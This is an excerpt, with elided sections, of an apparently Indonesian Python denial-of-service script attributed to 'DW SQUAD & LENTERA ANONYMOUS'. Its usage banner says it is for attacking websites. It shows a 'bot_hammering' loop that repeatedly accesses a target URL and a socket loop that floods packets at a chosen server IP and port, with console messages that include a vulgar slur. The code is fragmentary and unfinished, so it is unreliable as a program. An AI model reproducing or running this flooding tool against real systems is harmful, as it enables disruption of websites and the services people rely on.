...
def bot_hammering(url):
	try:
		while True:
			...
			print("\033[94mMR TROJAN SEDANG MENGAKSES...\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)
	...
	try:
		while True:
			...
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m Sedang Mengirim Paket Ngentod Sabar!  \033[0m")
			else:
				s.shutdown(1)
				print("\033[91mWEBISTE<->LEMAH\033[0m")
			time.sleep(.1)
	except socket.error as e:
		print("\033[91m WEBISTE  LEMAH\033[0m")
...
def usage():
	...
	_________________________________________________________________________________________________
        DW SQUAD & LENTERA ANONYMOUS
	_______________________________________________________________________________________________
    HANYA BISA DIGUNAKAN UNTUK MENGATTACK SEBUAH WEBSITE NUNGKIN KALO IP HP
	KAYANYA KAGA BISA......
	_________________________________________________________________________________________________
	Instagram :@000000000dw
	_________________________________________________________________________________________________
        usage : python3 dw.py [-s] [-p] [-t]BN
	-h : help
	-s : server ip
	-p : port default 80
...
if __name__ == '__main__':
	...
	try:
		...
		print("\033[91mTolong Check Server Ip Dan Portnya\033[0m")
		usage()
	while True:
